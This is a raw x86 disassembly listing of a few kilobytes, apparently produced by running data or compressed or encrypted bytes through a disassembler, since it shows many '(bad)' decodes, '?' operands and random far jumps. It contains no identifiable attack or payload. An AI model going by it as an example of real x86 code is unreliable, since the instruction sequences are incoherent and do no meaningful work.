  4118b3:	sbb    BYTE PTR [ecx+0x2a],0x89
  4118b7:	pop    ebx
  4118b8:	je     0x41192d
  4118ba:	jge    0x411873
  4118bc:	or     BYTE PTR [edx-0x69],0x17
  4118c0:	pushf  
  4118c1:	jecxz  0x4118f3
  4118c3:	ror    BYTE PTR [ebp+0x28bd441c],0xc1
  4118ca:	clc    
  4118cb:	jo     0x4118fa
  4118cd:	mov    WORD PTR es:[eax],cs
  4118d0:	pop    edi
  4118d1:	addr16 push ss
  4118d3:	aaa    
  4118d4:	push   es
  4118d5:	cmp    eax,0x2cea1694
  4118da:	xor    BYTE PTR [esi-0x76848db7],dh
  4118e0:	les    ecx,FWORD PTR [ebp+0x2a]
  4118e3:	cli    
  4118e4:	jmp    0x847b:0x9b2b9688
  4118eb:	cmp    eax,esi
  4118ed:	sbb    BYTE PTR [esi],ch
  4118ef:	pop    esp
  4118f0:	xchg   esi,eax
  4118f1:	and    cl,BYTE PTR [edx-0x4a836fc2]
  4118f7:	xor    BYTE PTR [ecx-0x72],dl
  4118fa:	xchg   edx,eax
  4118fb:	adc    eax,0x1c5226d9
  411900:	mov    edx,0xfb8a53bd
  411905:	sub    DWORD PTR [edx+0x1458c12e],esp
  41190b:	rcl    DWORD PTR [ebx-0x2a],cl
  41190e:	aas    
  41190f:	pushf  
  411910:	xchg   edi,eax
  411911:	cmp    eax,0x1ad64eb3
  411916:	pop    ss
  411917:	lods   al,BYTE PTR ds:[esi]
  411918:	mov    ds:0xa01a2e01,al
  41191d:	sbb    eax,0xd74001f2
  411922:	dec    esp
  411923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411924:	xchg   BYTE PTR [eiz*2-0x332506d1],dh
  41192b:	fsub   QWORD PTR [edi+0x10]
  41192e:	or     ebx,DWORD PTR [eax]
  411930:	retf   0xe703
  411933:	jg     0x4118de
  411935:	scas   eax,DWORD PTR es:[edi]
  411936:	fcom   DWORD PTR [eax+0x34558189]
  41193c:	pop    es
  41193d:	enter  0x32b1,0x20
  411941:	add    ebp,eax
  411943:	inc    eax
  411944:	jg     0x4118e0
  411946:	pop    ecx
  411947:	push   ds
  411948:	mov    BYTE PTR [ebp-0x39],cl
  41194b:	neg    DWORD PTR [edi+edi*8-0x7654e2ec]
  411952:	jne    0x41193a
  411954:	in     eax,dx
  411955:	mov    eax,0x9380a167
  41195a:	inc    ecx
  41195b:	add    eax,0xb6d3c075
  411960:	imul   bh
  411962:	or     DWORD PTR [ebx+edi*4+0x4e],ebp
  411966:	ret    0xe41e
  411969:	fcomp  DWORD PTR [eax-0x3a192451]
  41196f:	pop    ds
  411970:	stos   DWORD PTR es:[edi],eax
  411971:	retf   0xbacc
  411974:	xchg   BYTE PTR [edx-0x78],cl
  411977:	push   edi
  411978:	ja     0x411954
  41197a:	dec    edi
  41197b:	iret   
  41197c:	push   ecx
  41197d:	scas   eax,DWORD PTR es:[edi]
  41197e:	sub    BYTE PTR [edx],0x4a
  411981:	(bad)  
  411982:	xor    DWORD PTR [esi-0x56],esi
  411985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411986:	dec    edi
  411987:	sahf   
  411988:	icebp  
  411989:	xchg   ecx,eax
  41198a:	es xchg esp,eax
  41198c:	adc    DWORD PTR [eax-0x29],ecx
  41198f:	pop    eax
  411990:	les    ecx,FWORD PTR [esi+ebx*4-0x7c]
  411994:	and    eax,0xd94ea78a
  411999:	add    dl,cl
  41199b:	pushf  
  41199c:	sub    ebx,DWORD PTR [edi+0x5]
  41199f:	xor    BYTE PTR [ecx-0x4e],al
  4119a2:	jmp    eax
  4119a4:	aaa    
  4119a5:	int    0x7
  4119a7:	ret    0x76eb
  4119aa:	cmp    BYTE PTR [ebp+edi*8+0x78],ch
  4119ae:	test   al,0xd7
  4119b0:	rcl    ah,cl
  4119b2:	aam    0xe6
  4119b4:	mov    eax,0xecb26d17
  4119b9:	pop    esp
  4119ba:	imul   ebp,DWORD PTR [esi+0x253acab5],0x26
  4119c1:	xchg   edi,eax
  4119c2:	pop    ds
  4119c3:	add    eax,0xa7b4c64
  4119c8:	jmp    0x411a1b
  4119ca:	jg     0x411a28
  4119cc:	xchg   ebp,eax
  4119cd:	mov    dl,0x44
  4119cf:	(bad)  
  4119d0:	xor    ebx,DWORD PTR [ecx]
  4119d2:	clc    
  4119d3:	in     al,0x22
  4119d5:	fistp  WORD PTR [esp+edi*8]
  4119d8:	or     al,0xcf
  4119da:	sti    
  4119db:	inc    ebp
  4119dc:	retf   0xd6cc
  4119df:	pop    es
  4119e0:	add    ah,BYTE PTR [edx+0x21]
  4119e3:	push   0xffffff9a
  4119e5:	dec    esi
  4119e6:	call   0xc898f90e
  4119eb:	push   ecx
  4119ec:	fadd   QWORD PTR ds:0x96c85f61
  4119f2:	xor    ebx,edi
  4119f4:	sti    
  4119f5:	ins    DWORD PTR es:[edi],dx
  4119f6:	and    al,0x88
  4119f8:	jl     0x411a3d
  4119fa:	mov    DWORD PTR [eax+0x7289be71],edi
  411a00:	jb     0x41198b
  411a02:	xchg   ebp,eax
  411a03:	pop    ss
  411a04:	xchg   edx,eax
  411a05:	add    ebp,0xffffffb7
  411a08:	sti    
  411a09:	test   bl,0x80
  411a0c:	sub    esp,DWORD PTR [edx-0xc3cd76e]
  411a12:	outs   dx,BYTE PTR ds:[esi]
  411a13:	jmp    0x411a14
  411a15:	test   eax,0x5072d4f5
  411a1a:	sub    dh,ch
  411a1c:	dec    ebx
  411a1d:	dec    esi
  411a1e:	enter  0x974f,0xad
  411a22:	jnp    0x411a8e
  411a24:	cmp    DWORD PTR [edx-0x3],ecx
  411a27:	(bad)  
  411a28:	or     ebx,edi
  411a2a:	fdiv   QWORD PTR [ebx+0x7]
  411a2d:	rcl    BYTE PTR [edx-0x52],1
  411a30:	inc    ebp
  411a31:	mov    dl,0x84
  411a33:	and    eax,0x9fc0a182
  411a38:	cmp    eax,0xacc125d7
  411a3d:	pop    DWORD PTR [eax+0x12357e07]
  411a43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a44:	jbe    0x411a29
  411a46:	fcomp  QWORD PTR [eax]
  411a48:	dec    ecx
  411a49:	daa    
  411a4a:	arpl   cx,cx
  411a4c:	jne    0x411a26
  411a4e:	mov    ah,0x75
  411a50:	out    dx,eax
  411a51:	cmp    BYTE PTR [eax-0x268b90],0x63
  411a58:	push   cs
  411a59:	ror    DWORD PTR [eax],cl
  411a5b:	dec    esi
  411a5c:	jp     0x411a57
  411a5e:	in     eax,dx
  411a5f:	mov    ah,0x7d
  411a61:	imul   ecx,DWORD PTR [ebx+edi*4],0xffffff8b
  411a65:	fimul  DWORD PTR [edi-0x19950b7f]
  411a6b:	push   ds
  411a6c:	sti    
  411a6d:	push   0x6db8eeaa
  411a72:	fcmovbe st,st(6)
  411a74:	inc    edi
  411a75:	push   esp
  411a76:	fstp   DWORD PTR [esi]
  411a78:	loopne 0x411ac5
  411a7a:	cmp    eax,DWORD PTR [esi+0xc]
  411a7d:	pop    ebx
  411a7e:	sub    bl,ch
  411a80:	ret    
  411a81:	inc    eax
  411a82:	sbb    ecx,DWORD PTR [eax]
  411a84:	cs ds mov al,0x50
  411a88:	cmc    
  411a89:	ror    BYTE PTR [esi],0xff
  411a8c:	(bad)  
  411a8d:	outs   dx,DWORD PTR ds:[esi]
  411a8e:	in     eax,dx
  411a8f:	es push edi
  411a91:	xor    ch,BYTE PTR [ebp+0x4283e89e]
  411a97:	mov    ebx,0xc409c6f3
  411a9c:	icebp  
  411a9d:	mov    dh,BYTE PTR [edi+0x6]
  411aa0:	push   eax
  411aa1:	xor    eax,0x6fd3645a
  411aa6:	ja     0x411b1d
  411aa8:	test   BYTE PTR [edi],0x9e
  411aab:	outs   dx,DWORD PTR ds:[esi]
  411aac:	xor    bl,BYTE PTR [ecx-0x5b3ec197]
  411ab2:	sub    eax,0xf72e9416
  411ab7:	jb     0x411a44
  411ab9:	outs   dx,BYTE PTR ds:[esi]
  411aba:	push   ebx
  411abb:	stc    
  411abc:	xor    BYTE PTR [edi],ah
  411abe:	mov    al,ds:0x84a8c1fa
  411ac3:	lea    ebx,[esi]
  411ac5:	mov    ebp,esp
  411ac7:	sbb    BYTE PTR [ecx],0x5b
  411aca:	jmp    0x216d80cd
  411acf:	sar    dl,cl
  411ad1:	push   edx
  411ad2:	std    
  411ad3:	push   edi
  411ad4:	xor    bl,BYTE PTR ds:0x8d2bf9e2
  411ada:	jp     0x411a67
  411adc:	out    dx,al
  411add:	xchg   esi,eax
  411ade:	imul   esp,DWORD PTR [ecx+edx*2],0xffffffc8
  411ae2:	in     al,0x13
  411ae4:	push   ebp
  411ae5:	mov    ebp,0x36132633
  411aea:	xor    DWORD PTR [eax-0x6d1c7fd],esi
  411af0:	cmp    eax,0x5b47f49b
  411af5:	and    DWORD PTR [ebp+0x401a56b1],edx
  411afb:	pop    edx
  411afc:	outs   dx,BYTE PTR ds:[esi]
  411afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411afe:	idiv   BYTE PTR [esi+0x5e]
  411b01:	or     al,0x47
  411b03:	mov    al,0x52
  411b05:	mov    ah,0xe
  411b07:	cli    
  411b08:	jp     0x411a9e
  411b0a:	xor    eax,0x447c9bfa
  411b0f:	xchg   esp,eax
  411b10:	mov    ecx,0x9a021821
  411b15:	mov    bl,0x82
  411b17:	jmp    0xb278:0x90b3474c
  411b1e:	xchg   ebp,eax
  411b1f:	pop    ebx
  411b20:	cmp    BYTE PTR [ebx],bh
  411b22:	jnp    0x411b4f
  411b24:	sbb    cl,dl
  411b26:	fs push eax
  411b28:	fwait
  411b29:	shl    DWORD PTR ds:0xd5b6bc53,1
  411b2f:	mov    eax,?
  411b31:	popa   
  411b32:	cmp    cl,bl
  411b34:	cmp    dh,bl
  411b36:	add    dl,ch
  411b38:	iret   
  411b39:	sar    dl,cl
  411b3b:	(bad)  
  411b3c:	and    BYTE PTR [esi-0x7a7497b7],ah
  411b42:	sub    BYTE PTR ds:0x78e3f9a6,al
  411b48:	xchg   edi,eax
  411b49:	ins    WORD PTR es:[edi],dx
  411b4b:	data16 in al,dx
  411b4d:	loop   0x411bbb
  411b4f:	(bad)
  411b53:	cmp    eax,0x8b67a965
  411b58:	mov    bl,0xaa
  411b5a:	daa    
  411b5b:	dec    ebx
  411b5c:	cmp    BYTE PTR [esi],bl
  411b5e:	or     al,0x24
  411b60:	jnp    0x411b48
  411b62:	mov    cl,0x96
  411b64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b65:	pop    ebx
  411b66:	xchg   ebp,eax
  411b67:	mov    dh,0xd8
  411b69:	ds mov dl,0xb4
  411b6c:	out    dx,al
  411b6d:	add    edi,ecx
  411b6f:	pop    esp
  411b70:	gs ret 0xf300
  411b74:	scas   eax,DWORD PTR es:[edi]
  411b75:	add    BYTE PTR [ebp+0x20],al
  411b78:	pop    ebx
  411b79:	add    BYTE PTR [edx-0x167cd333],ah
  411b7f:	scas   al,BYTE PTR es:[edi]
  411b80:	call   0x44b3:0x7fa60dc5
  411b87:	pop    ecx
  411b88:	xor    al,0x8e
  411b8a:	dec    ebp
  411b8b:	out    dx,eax
  411b8c:	sahf   
  411b8d:	mov    ebp,0x3006b141
  411b92:	mov    ecx,DWORD PTR [esi+0x19d3170]
  411b98:	cmp    al,0x99
  411b9a:	test   al,0x9d
  411b9c:	xchg   edx,eax
  411b9d:	dec    ebp
  411b9e:	push   esi
  411b9f:	cmp    edx,ebp
  411ba1:	lahf   
  411ba2:	sub    ebx,edx
  411ba4:	push   cs
  411ba5:	cmp    eax,0xb2bac395
  411baa:	xchg   ebp,eax
  411bab:	pop    ecx
  411bac:	ret    0x79ee
  411baf:	dec    ebp
  411bb0:	jge    0x411bb7
  411bb2:	int3   
  411bb3:	pop    eax
  411bb4:	adc    BYTE PTR [ebp+0x1ecee32],cl
  411bba:	iret   
  411bbb:	jle    0x411c22
  411bbd:	scas   al,BYTE PTR es:[edi]
  411bbe:	jne    0x411b4d
  411bc0:	test   DWORD PTR [edi+0xbf33c31],ebx
  411bc6:	ret    
  411bc7:	imul   edx,esp,0xffffffa2
  411bca:	repnz inc esp
  411bcc:	pop    ds
  411bcd:	mov    bh,0x73
  411bcf:	cwde   
  411bd0:	in     al,0x61
  411bd2:	cmp    esi,eax
  411bd4:	lods   al,BYTE PTR ds:[esi]
  411bd5:	aam    0x17
  411bd7:	frstor [si+0x6bca]
  411bdc:	or     al,0x5c
  411bde:	bound  esi,QWORD PTR [edx-0x662e5a98]
  411be4:	pop    esi
  411be5:	and    bl,BYTE PTR [edi+0x2d]
  411be8:	fwait
  411be9:	cmp    DWORD PTR [ebx],0xaa1824a4
  411bef:	call   0x26626f4d
  411bf4:	xchg   ebx,eax
  411bf5:	outs   dx,DWORD PTR ds:[esi]
  411bf6:	pop    edi
  411bf7:	push   eax
  411bf8:	xchg   BYTE PTR [ebp-0x20d11b52],bl
  411bfe:	(bad)  
  411bff:	mov    ecx,0xbbe5a91d
  411c04:	outs   dx,BYTE PTR ds:[esi]
  411c05:	arpl   WORD PTR [ecx-0x5b8c3d1a],si
  411c0b:	scas   eax,DWORD PTR es:[edi]
  411c0c:	mov    bl,0x74
  411c0e:	cmp    BYTE PTR [eax],ah
  411c10:	ins    DWORD PTR es:[edi],dx
  411c11:	gs mov ecx,0xac32e3d2
  411c17:	adc    BYTE PTR [edx-0x27],al
  411c1a:	dec    esi
  411c1b:	pop    ecx
  411c1c:	xchg   BYTE PTR ss:[edx],bh
  411c1f:	sbb    al,0xa0
  411c21:	push   esi
  411c22:	cmp    al,0x9
  411c24:	sbb    bl,BYTE PTR [eax+0x3c]
  411c27:	mov    gs,WORD PTR [eax-0x7da49510]
  411c2d:	push   ecx
  411c2e:	ins    DWORD PTR es:[edi],dx
  411c2f:	push   ebp
  411c30:	int    0x16
  411c32:	jns    0x411c91
  411c34:	das    
  411c35:	iret   
  411c36:	out    0x55,eax
  411c38:	test   BYTE PTR [ebp+0x6c8c7fe9],al
  411c3e:	xor    DWORD PTR ds:0x52b37be5,0xe3c61ede
  411c48:	pop    ss
  411c49:	loopne 0x411bda
  411c4b:	inc    ebx
  411c4c:	dec    ebp
  411c4d:	jbe    0x411c6f
  411c4f:	sub    BYTE PTR [edx-0x32],0x80
  411c53:	pop    edi
  411c54:	jp     0x411cb7
  411c56:	retf   0x5e71
  411c59:	adc    dh,BYTE PTR [eax-0x80]
  411c5c:	fstp   st(2)
  411c5e:	aas    
  411c5f:	jae    0x411cc1
  411c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c62:	shr    ebp,cl
  411c64:	push   eax
  411c65:	jp     0x411c6d
  411c67:	cmp    esp,DWORD PTR [edx+edx*8-0x69]
  411c6b:	jmp    0x5dbf731f
  411c70:	mov    bl,0x5a
  411c72:	shl    BYTE PTR [edi-0x5f53cc44],cl
  411c78:	(bad)  
  411c7a:	loopne 0x411c36
  411c7c:	jne    0x411c4c
  411c7e:	pushf  
  411c7f:	mov    ch,0x34
  411c81:	xor    eax,0x60ba22fb
  411c86:	out    dx,eax
  411c87:	popf   
  411c88:	sub    esi,edx
  411c8a:	lahf   
  411c8b:	mov    ebp,0xec2c609d
  411c90:	cwde   
  411c91:	test   al,0xa1
  411c93:	adc    DWORD PTR [ebx+0x8],esi
  411c96:	mov    WORD PTR ds:0xfd814173,fs
  411c9c:	cmp    al,0x50
  411c9e:	adc    dl,bl
  411ca0:	test   DWORD PTR [eax+0x5dd973ee],ebp
  411ca6:	mov    edi,0xef58b94b
  411cab:	xchg   esi,eax
  411cac:	pop    es
  411cad:	xchg   ebx,eax
  411cae:	xchg   ecx,eax
  411caf:	xor    DWORD PTR [esi],ecx
  411cb1:	sub    BYTE PTR [ebx+0x624abc13],ah
  411cb7:	sub    al,0x31
  411cb9:	mov    ds:0x4ef372c,eax
  411cbe:	addr16 jp 0x411cf5
  411cc1:	push   esp
  411cc2:	shr    ah,1
  411cc4:	mov    ebp,0x3c5fb1c0
  411cc9:	inc    ebp
  411cca:	repz cmc 
  411ccc:	test   BYTE PTR [eax-0x48],0x44
  411cd0:	aad    0x4e
  411cd2:	inc    ebx
  411cd3:	fcmovb st,st(7)
  411cd5:	test   eax,0x7ba45bc3
  411cda:	xchg   ebp,eax
  411cdb:	cmc    
  411cdc:	outs   dx,DWORD PTR ds:[esi]
  411cdd:	push   esp
  411cde:	pop    esi
  411cdf:	cmp    cl,BYTE PTR [edx-0x8ff9ad3]
  411ce5:	pop    ebp
  411ce6:	test   al,0x76
  411ce8:	pop    eax
  411ce9:	mov    dh,0x57
  411ceb:	inc    edx
  411cec:	jp     0x411cf4
  411cee:	int3   
  411cef:	pop    edx
  411cf0:	ret    0x2b3c
  411cf3:	ins    DWORD PTR es:[edi],dx
  411cf4:	ret    0x1838
  411cf7:	pop    eax
  411cf8:	pop    eax
  411cf9:	jne    0x411ce4
  411cfb:	fisub  DWORD PTR [ecx+0x1dfc4e8c]
  411d01:	push   ebp
  411d02:	scas   eax,DWORD PTR es:[edi]
  411d03:	inc    esp
  411d04:	lea    ecx,[ebx-0x4e]
  411d07:	out    0xdd,al
  411d09:	add    DWORD PTR [edx+0x51],0x9a787d96
  411d10:	cmp    al,0x54
  411d12:	cmp    edx,DWORD PTR [edi-0x35f4e810]
  411d18:	xchg   ecx,eax
  411d19:	dec    ebx
  411d1a:	ret    0x4c44
  411d1d:	mov    cl,0x39
  411d1f:	xlat   BYTE PTR ds:[ebx]
  411d20:	mov    ecx,0xfaeffad0
  411d25:	push   edi
  411d26:	jecxz  0x411d64
  411d28:	ret    
  411d29:	and    bh,BYTE PTR [edi-0x7cd88705]
  411d2f:	or     eax,0x1773e1e3
  411d34:	outs   dx,BYTE PTR ds:[esi]
  411d35:	dec    ebx
  411d36:	pop    eax
  411d37:	or     esp,ebx
  411d39:	xchg   ecx,eax
  411d3a:	adc    eax,0xdc03a5fe
  411d3f:	js     0x411d61
  411d41:	jb     0x411da3
  411d43:	icebp  
  411d44:	scas   eax,DWORD PTR es:[edi]
  411d45:	pop    esi
  411d46:	aad    0x7
  411d48:	test   ecx,ebp
  411d4a:	loope  0x411d32
  411d4c:	jecxz  0x411d28
  411d4e:	jl     0x411d80
  411d50:	in     al,0x39
  411d52:	repnz mov ch,BYTE PTR [eax-0x1c]
  411d56:	jo     0x411ce9
  411d58:	adc    BYTE PTR [esi+0x2f],dl
  411d5b:	mov    ?,edx
  411d5d:	or     BYTE PTR es:[eax-0x58],cl
  411d61:	popa   
  411d62:	sar    BYTE PTR [edi+0x7091dc6f],1
  411d68:	dec    edi
  411d69:	mov    dh,0xc8
  411d6b:	xchg   ecx,eax
  411d6c:	mov    edi,0xaffbc753
  411d71:	push   ss
  411d72:	adc    al,0x9
  411d74:	fwait
  411d75:	xchg   ebx,eax
  411d76:	popf   
  411d77:	cmp    al,0xa2
  411d79:	jnp    0x411d3e
  411d7b:	sbb    al,0x1b
  411d7d:	retf   
  411d7e:	sbb    BYTE PTR [eax],ah
  411d80:	enter  0xecce,0xf8
  411d84:	pop    ds
  411d85:	push   cs
  411d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d87:	sub    al,BYTE PTR [esi-0xe08f91e]
  411d8d:	int    0x4e
  411d8f:	stos   DWORD PTR es:[edi],eax
  411d90:	mov    ah,0xe3
  411d92:	xor    eax,0xad5d49b
  411d97:	ret    0x6be
  411d9a:	scas   eax,DWORD PTR es:[edi]
  411d9b:	sub    bl,dh
  411d9d:	fwait
  411d9e:	(bad)  
  411d9f:	and    al,0x4
  411da1:	test   eax,0xc6ecec1e
  411da6:	rcr    BYTE PTR [edi+0x315bc8a],cl
  411dac:	call   0xd4f1f099
  411db1:	ins    DWORD PTR es:[edi],dx
  411db2:	jl     0x411d59
  411db4:	daa    
  411db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411db6:	mov    edi,0x78e26a10
  411dbb:	popa   
  411dbc:	jno    0x411de3
  411dbe:	pop    ss
  411dbf:	ret    
  411dc0:	mov    ebx,0xea8f8fa2
  411dc5:	fld    TBYTE PTR [ebx-0x31]
  411dc8:	ficom  DWORD PTR [ecx]
  411dca:	jg     0x411de6
  411dcc:	push   ebp
  411dcd:	int3   
  411dce:	repz push cs
  411dd0:	xchg   edx,eax
  411dd1:	popa   
  411dd2:	clc    
  411dd3:	mov    ah,0x3e
  411dd5:	popf   
  411dd6:	ds push ecx
  411dd8:	jg     0x411dda
  411dda:	add    eax,0x242b8e49
  411ddf:	aad    0xa
  411de1:	mov    edx,DWORD PTR ds:0x65863aa4
  411de7:	sar    BYTE PTR [ebx-0x25],cl
  411dea:	imul   edx,DWORD PTR [ecx],0x6d
  411ded:	mov    ds:0xb0882919,eax
  411df2:	xchg   esi,eax
  411df3:	mov    eax,0xa510f509
  411df8:	sub    dl,BYTE PTR [ebx-0x6c5e4462]
  411dfe:	aaa    
  411dff:	and    al,0x5b
  411e01:	jmp    0x3fa3b638
  411e06:	mov    al,0xc5
  411e08:	std    
  411e09:	pop    es
  411e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e0b:	mov    dl,0xc5
  411e0d:	or     DWORD PTR [edx-0x2f3f6e28],edx
  411e13:	add    cl,BYTE PTR [edi+0x6b]
  411e16:	test   edi,edx
  411e18:	outs   dx,DWORD PTR ds:[esi]
  411e19:	bound  ebx,QWORD PTR [edi-0x67d219cf]
  411e1f:	or     al,0x53
  411e21:	push   ecx
  411e22:	pop    edi
  411e23:	pop    ss
  411e24:	test   al,0x59
  411e26:	xchg   ecx,eax
  411e27:	xchg   esi,eax
  411e28:	clc    
  411e29:	mov    eax,ds:0xc72c8ba3
  411e2e:	xor    cl,dl
  411e30:	in     eax,dx
  411e31:	ret    0x9166
  411e34:	call   0x48566b6e
  411e39:	nop
  411e3a:	jb     0x411dc2
  411e3c:	mov    dl,0x3a
  411e3e:	int    0x18
  411e40:	xor    eax,0xa4a00246
  411e45:	mov    esi,0x7b7d491c
  411e4a:	cmp    BYTE PTR [edi-0x6b0cd75c],bh
  411e50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e51:	imul   ebp,DWORD PTR [eax],0x859fbd85
  411e57:	fidivr WORD PTR [esi-0x71]
  411e5a:	sub    al,0x9f
  411e5c:	idiv   DWORD PTR [edx]
  411e5e:	jb     0x411eb6
  411e60:	mov    ebx,0x3a5c6756
  411e65:	xchg   DWORD PTR [edx*8-0x642a903b],edx
  411e6c:	add    ah,BYTE PTR [ecx+0x492c2725]
  411e72:	mov    WORD PTR [edi+0x1840b8d6],?
  411e78:	fwait
  411e79:	push   es
  411e7a:	mov    ebp,0xfddc455a
  411e7f:	jecxz  0x411e3c
  411e81:	retf   
  411e82:	daa    
  411e83:	dec    ebp
  411e84:	aas    
  411e85:	in     al,0x9f
  411e87:	push   es
  411e88:	lds    esp,FWORD PTR [edx+0x58afa5bf]
  411e8e:	aaa    
  411e8f:	mov    ?,WORD PTR [edx+ebx*8]
  411e92:	adc    eax,0x9916a8fb
  411e97:	imul   DWORD PTR [edx]
  411e99:	xor    BYTE PTR [ebp+0x27225e22],bl
  411e9f:	xchg   esp,eax
  411ea0:	mov    al,ds:0x7496cbe0
  411ea5:	iret   
  411ea6:	arpl   WORD PTR [ebx+0x3828e916],bp
  411eac:	xor    edi,DWORD PTR [ecx-0x1859ddc9]
  411eb2:	rcl    DWORD PTR ds:0xfad1a2cf,1
  411eb8:	push   edi
  411eb9:	push   DWORD PTR [ecx+0x8484cb6]
  411ebf:	int3   
  411ec0:	adc    al,BYTE PTR [esi+esi*1-0x3]
  411ec4:	dec    eax
  411ec5:	lahf   
  411ec6:	inc    esp
  411ec7:	xor    ebp,edi
  411ec9:	jp     0x411f1f
  411ecb:	mov    dh,0x86
  411ecd:	mov    bh,0xe0
  411ecf:	jge    0x411eed
  411ed1:	mov    gs,WORD PTR [ebx-0x7e9a6b4f]
  411ed7:	jmp    0x8cfe0009
  411edc:	mov    ch,0xbc
  411ede:	lds    ecx,FWORD PTR [ebx]
  411ee0:	test   BYTE PTR [edi],0x49
  411ee3:	in     eax,dx
  411ee4:	in     eax,0xc5
  411ee6:	mov    edx,gs
  411ee8:	push   ecx
  411ee9:	dec    ebp
  411eea:	add    BYTE PTR [edx+ecx*2],bl
  411eed:	jbe    0x411f18
  411eef:	mov    ebx,0xd5ba2dc3
  411ef4:	ja     0x411ebd
  411ef6:	test   al,0x2e
  411ef8:	ror    DWORD PTR [ebx],0x29
  411efb:	cmp    ebx,ecx
  411efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411efe:	adc    DWORD PTR [edx],ecx
  411f00:	sbb    ch,BYTE PTR [edi-0x53]
  411f03:	paddd  mm6,QWORD PTR [ecx]
  411f06:	repnz hlt 
  411f08:	adc    cl,0x57
  411f0b:	dec    esp
  411f0c:	pop    esi
  411f0d:	pop    DWORD PTR [ebx+0x62]
  411f10:	jb     0x411edc
  411f12:	jecxz  0x411f46
  411f14:	mov    ds:0x1b249aa6,al
  411f19:	shl    BYTE PTR [edi+0x62],1
  411f1c:	inc    edi
  411f1d:	pop    ss
  411f1e:	or     DWORD PTR [edx],esi
  411f20:	rcr    bh,cl
  411f22:	arpl   WORD PTR [esi+0x29d8fbeb],bx
  411f28:	jbe    0x411ed1
  411f2a:	sub    DWORD PTR [eax-0x40],ebp
  411f2d:	loope  0x411f1f
  411f2f:	cmp    DWORD PTR [esp+edx*2-0x4f191e9f],edx
  411f36:	loope  0x411f99
  411f38:	out    0xf7,eax
  411f3a:	mov    eax,0x6310cc6d
  411f3f:	sub    al,0xf5
  411f41:	ficom  WORD PTR [ebp+edi*1+0x6306aa66]
  411f48:	icebp  
  411f49:	add    DWORD PTR [ebp+0x663c0b00],edx
  411f4f:	or     al,0x7d
  411f51:	and    BYTE PTR [edi-0x1],cl
  411f54:	jp     0x411f4c
  411f56:	jge    0x411f25
  411f58:	test   BYTE PTR [edx],dl
  411f5a:	cmc    
  411f5b:	enter  0x560a,0x18
  411f5f:	ret    
  411f60:	imul   ebp,DWORD PTR [eax-0x6d70a00b],0xffffffca
  411f67:	in     al,0xb
  411f69:	hlt    
  411f6a:	and    DWORD PTR [esi+0x4588caf5],edx
  411f70:	dec    edi
  411f71:	inc    esi
  411f72:	inc    DWORD PTR [ebx]
  411f74:	inc    edx
  411f75:	(bad)  
  411f76:	push   cs
  411f77:	sub    eax,DWORD PTR [eax]
  411f79:	data16 and BYTE PTR [edx-0x68712ba3],0x42
  411f81:	dec    esp
  411f82:	jnp    0x411f29
  411f84:	inc    edx
  411f85:	int    0x63
  411f87:	sbb    ecx,ebp
  411f89:	retf   
  411f8a:	loop   0x411f72
  411f8c:	or     DWORD PTR [esi+0x55ec006c],esi
  411f92:	xchg   edi,eax
  411f93:	(bad)  
  411f94:	icebp  
  411f95:	hlt    
  411f96:	test   al,0xe9
  411f98:	sub    edx,edi
  411f9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f9b:	mov    esi,0xdeb13f42
  411fa0:	popf   
  411fa1:	push   0xffffffbe
  411fa3:	mov    dl,0x4d
  411fa5:	test   DWORD PTR [ecx-0x52],eax
  411fa8:	int3   
  411fa9:	mov    eax,0x50158997
  411fae:	sub    BYTE PTR [edx+0xe],cl
  411fb1:	and    eax,0xa7e8aea6
  411fb6:	cdq    
  411fb7:	jnp    0x411f68
  411fb9:	int3   
  411fba:	add    al,0x93
  411fbc:	sub    al,0x4
  411fbe:	sub    bl,BYTE PTR [eax-0x33]
  411fc1:	or     eax,0x91c38bfd
  411fc6:	pop    edx
  411fc7:	inc    esi
  411fc8:	lock ins BYTE PTR es:[edi],dx
  411fca:	dec    ecx
  411fcb:	sbb    cl,dl
  411fcd:	outs   dx,BYTE PTR ds:[esi]
  411fce:	add    edi,DWORD PTR [esi-0x50]
  411fd1:	add    eax,0xbdf8df77
  411fd6:	add    edi,DWORD PTR [esi-0x6e]
  411fd9:	push   edx
  411fda:	test   edx,ebx
  411fdc:	hlt    
  411fdd:	inc    edi
  411fde:	inc    ecx
  411fdf:	inc    esi
  411fe0:	(bad)  
  411fe2:	out    dx,eax
  411fe3:	pop    esp
  411fe4:	call   0x19ad4354
  411fe9:	fwait
  411fea:	bound  esi,QWORD PTR [ebx*2-0x3934a6ca]
  411ff1:	add    dh,BYTE PTR [ebx+0x6424f571]
  411ff7:	in     eax,0x5f
  411ff9:	push   eax
  411ffa:	xor    eax,0x8ce9cab0
  411fff:	sub    eax,0x9b779922
  412004:	fmul   QWORD PTR [eax+0x68b5e6b5]
  41200a:	mov    ebp,0x8852a9b3
  41200f:	jle    0x412053
  412011:	add    eax,0xd839296e
  412016:	pushf  
  412017:	(bad)  
  412018:	push   esp
  412019:	mov    dh,BYTE PTR [esi+0x62642ef0]
  41201f:	sar    DWORD PTR [edx+0x54b65f01],0x6a
  412026:	into   
  412027:	adc    DWORD PTR [eax-0x60a4873f],ecx
  41202d:	aaa    
  41202e:	popf   
  41202f:	in     eax,0xc9
  412031:	fsubr  DWORD PTR [ebx-0x5]
  412034:	sub    dh,dl
  412036:	mov    fs,WORD PTR [edx-0x6a]
  412039:	sti    
  41203a:	int3   
  41203b:	ror    BYTE PTR [edi+0x2a],1
  41203e:	fmul   QWORD PTR [ebx+0x6e]
  412041:	outs   dx,DWORD PTR ds:[esi]
  412042:	es mov ebp,0x439979cb
  412048:	push   ecx
  412049:	dec    edi
  41204a:	push   eax
  41204b:	inc    esp
  41204c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204d:	mov    bl,0x6e
  41204f:	mov    esi,0xb8ec328e
